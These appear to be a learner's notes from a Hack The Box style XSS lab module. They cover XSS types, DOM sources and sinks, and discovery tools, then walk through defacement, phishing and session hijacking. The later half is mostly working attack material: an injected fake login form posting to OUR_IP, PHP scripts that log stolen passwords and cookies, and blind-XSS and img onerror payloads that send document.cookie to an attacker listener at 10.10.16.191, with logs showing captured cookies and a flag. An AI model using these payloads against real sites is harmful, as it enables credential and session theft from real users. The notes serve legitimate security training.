# Cross site scripting

### \*\*XSS Detection

| **Test Type**         | **Common Payload**                                   | **What to Observe**                                   |
| --------------------- | ---------------------------------------------------- | ----------------------------------------------------- |
| **Simple Reflection** | `<u>test</u>`                                        | Does "test" appear **underlined** on the page?        |
| **Basic Script**      | `<script>alert(1)</script>`                          | Does a **pop-up box** appear?                         |
| **Image Bypass**      | `<img src=x onerror=alert(1)>`                       | Does a pop-up appear even if `<script>` is blocked?   |
| **URL Encoded**       | `%3cscript%3ealert(1)%3c/script%3e`                  | Bypasses filters looking for the `<` and `>` symbols. |
| **Attribute Break**   | `"><script>alert(1)</script>`                        | Closes a tag (like `<input>`) to run your script.     |
| **SVG (Modern)**      | `<svg onload=alert(1)>`                              | Effective against modern "Blacklist" filters.         |
| **Blind XSS**         | `<script src="http://10.10.16.129:8081/x"></script>` | No pop-up; check your **listener logs** for a hit.    |

| Type                             | Description                                                                                                                                                                                                                                                                                                               |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                                                                                                |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                                                                                              |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)                                                                              |
| `Blind XSS`                      | Is essentially a "delayed-action" version of Stored XSS. It is called "blind" because the attacker has no way of seeing the payload execute in real-time. Instead, the payload is stored by the server and executed later in a part of the application the attacker cannot access—usually a backend administrative panel. |

The XSS payloads used in these module

```
<script>alert(window.origin)</script>
'<script>alert(window.origin)</script>
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
'<img src="http://10.10.16.191:8081/index.php">
```

_Now days most of the modern applications block the alert() function or the word in these cases we can use the print() ._

There are two types of `Non-Persistent XSS` vulnerabilities: `Reflected XSS`, which gets processed by the back-end server, and `DOM-based XSS`, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, `Non-Persistent XSS` vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page

There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute

We see that the input parameter in the URL is using a hashtag `#` for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a `DOM-based XSS`

On the other hand, the `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:

* `document.write()`
* `DOM.innerHTML`
* `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:

* `add()`
* `after()`
* `append()`

Think of the **Source** and the **Sink** as the two ends of a pipe. In DOM-based XSS, the "water" flowing through that pipe is the user's input.

***

### \* The Source: Where the Data Starts\*

The **Source** is any JavaScript property that allows an attacker to inject a string into the application. It is the "input" point. Since this is DOM-based, the source is usually a part of the URL or the browser environment that JavaScript can read.

**Common Sources:**

* `location.search` (The part after the `?` in a URL)
* `location.hash` (The part after the `#` in a URL)
* `document.referrer` (The URL of the page that linked to the current page)
* `window.name` (A property that can persist across page loads)

***

### \*\* The Sink: Where the Data Ends Up\*\*

The **Sink** is a "dangerous" JavaScript function or DOM object that can execute code or render HTML. If the data from a **Source** reaches a **Sink** without being cleaned (sanitized), the browser will treat that data as code and execute it.

**Common Sinks (as you noted):**

* **Execution Sinks:** `eval()`, `setTimeout()`, `setInterval()` (These take a string and run it as code).
* **HTML Sinks:** `document.write()`, `.innerHTML`, `.outerHTML` (These take a string and render it as HTML/JavaScript).
* **jQuery Sinks:** `.html()`, `.append()`, `.prepend()`.

***

### **The "Data Flow" Relationship**

A vulnerability only exists if there is a direct path from a **Source** to a **Sink**.

> **Example Workflow:**
>
> 1. **Source:** A user visits `site.com/#<img src=x onerror=alert(1)>`. The browser stores that string in `location.hash`.
> 2. **Processing:** The developer's JavaScript reads the hash: `var userNote = location.hash;`.
> 3. **Sink:** The developer then writes that note to the page: `document.getElementById('display').innerHTML = userNote;`.
> 4. **The Result:** Because `.innerHTML` is a sink, it renders the `<img>` tag, the image fails to load, and the `onerror` JavaScript triggers the aler

\*\*The automated tools to detect the XSS

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).

\*\*These are the list of the payloads [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) [Payload-Box](https://github.com/payload-box/xss-payload-list)

\*\*Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page)

### Defacement Elements

defacing means we can change the website looks by the how ever we want

We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.

Four HTML elements are usually utilized to change the main look of a web page:

* Background Color `document.body.style.background`
* Background `document.body.background`
* Page Title `document.title`
* Page Text `DOM.innerHTML`

**Phishing attack**

```

document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

These is the payload we are using for the phishing attack based on the XSS

When ever we are trying the phishing XSS first we need to find the working XSS payload form the input of the application.

```
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://SERVER_IP/phishing/index.php"); fclose($file); exit(); } ?>
```

After we create the working phishing attack by the XSS . After these we want to connect to the our VM to capture the credentials we want to create these php code In our VM we can create like these in the below

```
Umedh@htb[/htb]$ mkdir /tmp/tmpserver Umedh@htb[/htb]$ cd /tmp/tmpserver Umedh@htb[/htb]$ vi index.php #at this step we wrote our index.php file Umedh@htb[/htb]$ sudo php -S 0.0.0.0:80 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

**Session hijacking**

session hijacking means in here we are steeling the cookie from the victim in the phishing we are steeling the username and password but in here we are steeling the cookie

if we need to do the session hijacking by using the XSS first we need to find the valid XSS

most of the session hijacking is a blind XSS

in the most of the labs we use these kind of payloads for the blind XSS

`"><script src=http://10.10.16.191:8081/url></script>`

in the above payloads in the src is the attacker ip connect back to the attacker

```

<?php if (isset($_GET['c'])) { $list = explode(";", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); fclose($file); } } ?>
```

the above php code is used to steel the cookie from the victims and send back to the attacker

when ever we find the blind XSS the attacker can get the message like these after that the attacker change the payload like these

```
"><script src=http://10.10.16.191:8081/url></script>
```

```
							TO
```

```
"><script src=http://10.10.16.191:8081/index.php></script>
```

In the above index.php is there the above php code of the session hijacking

after getting the cookie will store on the cookie.txt on the attacker VM

```

┌──(umedh㉿kali)-[~]
└─$ sudo php -S 10.10.16.191:8081
[Sat Mar 28 16:14:16 2026] PHP 8.4.11 Development Server (http://10.10.16.191:8081) started
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36630 Accepted
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36630 [200]: GET /url
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36630 Closing
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36632 Accepted
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36632 Closed without sending a request; it was probably just an unused speculative preconnection
[Sat Mar 28 16:16:49 2026] 10.129.33.71:36632 Closing
[Sat Mar 28 16:17:19 2026] 10.129.33.71:36660 Accepted
[Sat Mar 28 16:17:19 2026] 10.129.33.71:36660 [200]: GET /index.php
[Sat Mar 28 16:17:19 2026] 10.129.33.71:36660 Closing
┌──(umedh㉿kali)-[~]
└─$ cat cookies.txt
Victim IP: 10.129.234.166 | Cookie: cookie=c00k1355h0u1d8353cu23d
Victim IP: 10.129.234.166 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

the session hijacking is happens when the cookies httponly flag is off when the httponly is on we can't steel cookie because of we can't steel cookie by using the javascript or by using the any lang

```
<img src=x onerror="this.src='http://10.10.16.191:8081/index.php?c='+document.cookie">
```

_By using the above payload we can directly capture the cookie or flag directly to the reverse shell or reconnect without creating the text file_

```
┌──(umedh㉿kali)-[~]
└─$ sudo php -S 10.10.16.191:8081
[Sat Mar 28 23:21:23 2026] 10.129.33.252:37032 Accepted
[Sat Mar 28 23:21:24 2026] 10.129.33.252:37032 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1774720282;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Sat Mar 28 23:21:24 2026] 10.129.33.252:37032 Closing
```
